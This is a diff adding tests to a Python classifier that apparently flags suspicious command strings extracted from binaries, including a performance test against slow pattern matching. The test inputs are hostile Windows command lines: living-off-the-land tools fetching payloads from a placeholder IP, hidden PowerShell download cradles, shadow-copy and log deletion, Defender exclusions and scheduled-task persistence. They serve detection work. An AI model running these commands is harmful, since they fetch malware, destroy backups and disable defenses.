@@ -1,3 +1,5 @@
+import time
+
 from gokdogan.strings_ext import analyze_strings, classify, extract_strings
 
 
@@ -26,6 +28,58 @@ def test_classify_registry_and_command():
     assert classify("cmd.exe /c whoami") == "command"
     assert classify("powershell -enc SQBFAFgA") == "command"
     assert classify("vssadmin delete shadows /all /quiet") == "command"
+
+
+def test_lolbin_invocations_are_commands():
+    assert classify("regsvr32 /s /n /u /i:http://203.0.113.5/a.sct scrobj.dll") == "command"
+    assert classify("powershell -nop -w hidden -c IEX (New-Object Net.WebClient)") == "command"
+    assert classify("certutil -urlcache -split -f http://203.0.113.5/a.exe") == "command"
+    assert classify("bitsadmin /transfer job http://203.0.113.5/a.exe C:/a.exe") == "command"
+    assert classify("mshta http://203.0.113.5/a.hta") == "command"
+    assert classify("schtasks /create /tn upd /tr C:/a.exe /sc onlogon") == "command"
+
+
+def test_invocations_spelled_with_exe_or_a_path_are_commands():
+    for text in ("bcdedit.exe /set {current} nx OptIn",
+                 r"C:\Windows\System32\bcdedit.exe /set {current} bootmenupolicy Standard",
+                 "vssadmin.exe Delete Shadows /For=D: /Oldest",
+                 "wmic.exe shadowcopy where id=1 delete",
+                 "wbadmin.exe delete catalog",
+                 "wevtutil.exe cl Application"):
+        assert classify(text) == "command", text
+
+
+def test_powershell_parameter_prefixes_are_commands():
+    # PowerShell accepts any unambiguous prefix of a parameter name.
+    for text in ("powershell.exe -ec SQBFAFgAIAAoAE4AZQB3AC0ATwBi",
+                 "powershell -ep bypass -File a.ps1",
+                 "powershell -w 1 -c Get-Date",
+                 "powershell -NoProfile -NonInteractive -Command %s",
+                 r"powershell -Command Add-MpPreference -ExclusionPath C:\ProgramData"):
+        assert classify(text) == "command", text
+
+
+def test_lolbin_run_from_a_user_writable_folder_is_a_command():
+    assert classify(r"rundll32.exe %TEMP%\x.dll,Start") == "command"
+    assert classify(r"regsvr32 /s C:\Users\Public\x.dll") == "command"
+
+
+def test_classification_stays_linear_on_hostile_strings():
+    # One long printable run repeating a tool name used to take tens of
+    # seconds (unbounded gaps after each name); it must stay well under that.
+    for token in ("powershell ", "rundll32 ", "schtasks ", "certutil ", "wmic ", "bcdedit "):
+        text = token * 20_000
+        start = time.perf_counter()
+        classify(text)
+        assert time.perf_counter() - start < 2.0, token
+
+
+def test_bare_lolbin_names_are_not_commands():
+    # Windows components name these tools constantly; only the invocation counts.
+    assert classify(r"C:\Windows\System32\rundll32.exe shell32.dll,Control_RunDLL") == "lolbin"
+    assert classify("regsvr32.exe") == "lolbin"
+    assert classify("powershell.exe") == "lolbin"
+    assert classify("whoami") == "lolbin"
 
 
 def test_classify_pdb_and_path():
